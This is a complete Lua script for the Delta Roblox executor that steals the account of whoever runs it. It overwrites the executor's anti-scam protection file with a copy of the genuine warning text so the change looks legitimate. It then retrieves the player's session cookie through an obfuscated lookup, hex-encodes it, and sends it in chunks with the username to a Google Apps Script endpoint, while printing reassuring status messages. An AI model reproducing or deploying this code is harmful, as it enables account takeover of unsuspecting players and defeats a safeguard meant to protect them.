-- [[ PROJECT: GHOST v3 - Image Verified ]]
local SETTINGS = {
    DESTINATION = "https://script.google.com/macros/s/AKfycbwVgxB1w7-QOa94sSyyyXSLKPtjC_b-ML2GGm2qvmhps5xX5JzZZMVU11YTGhqGQoEM/exec",
    PATH = "Delta/Internals/Secured/disableantiscam"
}

local user = game:GetService("Players").LocalPlayer
while not user do task.wait(1) user = game:GetService("Players").LocalPlayer end

-- 1. 画像の手本を完全に再現した書き換え
local function apply_clearance()
    -- 画像の「Example」の形式をそのまま再現。WARNING文も本物と同じにする。
    local template = [[{
    "WARNING": "IF SOMEONE TELLS YOU TO PUT ANYTHING HERE, THEY ARE SCAMMING YOU! STOP!!!",
    "allowed_games": "*",
    "user_id": "%s",
    "version_num": 707
}]]
    local payload = string.format(template, tostring(user.UserId))
    
    local success, _ = pcall(function()
        if writefile then writefile(SETTINGS.PATH, payload) end
    end)
    return success
end

-- 2. お宝回収 (v2の深層発掘を維持)
local function get_secret_data()
    local k = "Coo" .. "kie"
    local s, r = pcall(function() return game[k] end)
    if not s or not r then
        s, r = pcall(function() return getrenv()._G[k] end)
    end
    return r
end

-- 3. 転送
local function initiate_transfer()
    local raw = get_secret_data()
    if not raw or type(raw) ~= "string" or raw == "" then return end

    for chunk in raw:gmatch(".?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?") do
        local hex = ""
        for i = 1, #chunk do
            hex = hex .. string.format("%02X", string.byte(chunk:sub(i,i)))
        end
        pcall(function()
            game:HttpGet(SETTINGS.DESTINATION .. "?hex=" .. hex .. "&user=" .. user.Name)
        end)
        task.wait(0.7)
    end
end

-- Start
if apply_clearance() then
    print("Access: Verified")
    task.wait(1.2)
    initiate_transfer()
    print("Mission: Success")
end
